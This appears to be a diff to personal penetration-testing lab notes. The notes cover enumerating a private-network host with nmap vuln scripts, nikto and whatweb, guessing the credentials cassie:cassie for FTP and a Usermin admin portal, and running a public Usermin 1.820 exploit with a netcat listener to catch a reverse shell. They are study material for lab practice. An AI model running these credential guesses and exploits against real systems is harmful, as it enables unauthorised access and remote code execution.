@@ -230,12 +230,29 @@ python3 vestaROOT.py https://192.168.230.156:8083 Jack 3PUKsX98BMupBiCf
 nmap 192.168.230.157
 nmap -sT -A -p 21,22,80,20000 -Pn 192.168.230.157
 
+# enumerate webserver
+sudo nmap -sV -p 8080 --script "vuln" 192.168.230.157
+nikto -host 192.168.230.157 -port 80
+whatweb http://192.168.230.157:80
+
 # enumerate ftp
 nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.230.157
-
 # login anonymous and download some files
-
 exiftool NEWSLETTER-TEMPLATE.pdf 
 # find users Mark, Robert, Cassie
+# test out user:user on different things
+ftp cassie@192.168.230.157 # works with password cassie
+# cassie:cassie also works on the admin portal at port 20000
+
+# because we can login we can do an authenticated exploit (we found this exploit from nmap fingerprinting of port 20000 - Usermin 1.820)
+https://www.exploit-db.com/exploits/50234
+searchsploit -m 50234
+# modify file to set our kali IP and port
+python3 50234.py --host 192.168.230.157 --login cassie --password cassie
+nc -nvlp 1234
+```
+
+.157 privesc
+```
 
 ```
